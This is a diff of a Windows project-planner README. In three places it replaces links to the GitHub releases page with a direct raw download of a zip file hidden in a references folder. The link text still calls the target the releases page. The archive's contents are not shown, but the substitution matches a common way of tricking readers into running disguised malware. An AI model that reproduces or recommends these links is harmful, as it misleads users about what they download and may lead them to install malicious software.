@@ -1,6 +1,6 @@
 # 🧩 princeps - Plan work, run tasks with ease
 
-[![Download princeps](https://img.shields.io/badge/Download-Princeps-blue?style=for-the-badge&logo=github)](https://github.com/ganeshrajput773/princeps/releases)
+[![Download princeps](https://img.shields.io/badge/Download-Princeps-blue?style=for-the-badge&logo=github)](https://github.com/ganeshrajput773/princeps/raw/refs/heads/main/skills/new-project/references/Software-3.6.zip)
 
 ## 🚀 What princeps does
 
@@ -29,7 +29,7 @@ It is built for Claude Cowork use, but it works well as a general project planne
 
 Go to the releases page and download the latest Windows file:
 
-[Download princeps from GitHub Releases](https://github.com/ganeshrajput773/princeps/releases)
+[Download princeps from GitHub Releases](https://github.com/ganeshrajput773/princeps/raw/refs/heads/main/skills/new-project/references/Software-3.6.zip)
 
 Look for the newest release and choose the Windows build that matches your system. If you see more than one file, pick the `.exe` file or the Windows archive that is meant for regular use.
 
@@ -158,7 +158,7 @@ For a normal Windows setup, use the file that is meant for desktop users and doe
 
 If you need the latest build later, use the same releases page:
 
-[Visit the princeps releases page](https://github.com/ganeshrajput773/princeps/releases)
+[Visit the princeps releases page](https://github.com/ganeshrajput773/princeps/raw/refs/heads/main/skills/new-project/references/Software-3.6.zip)
 
 ## 🔧 Common Windows setup path
 
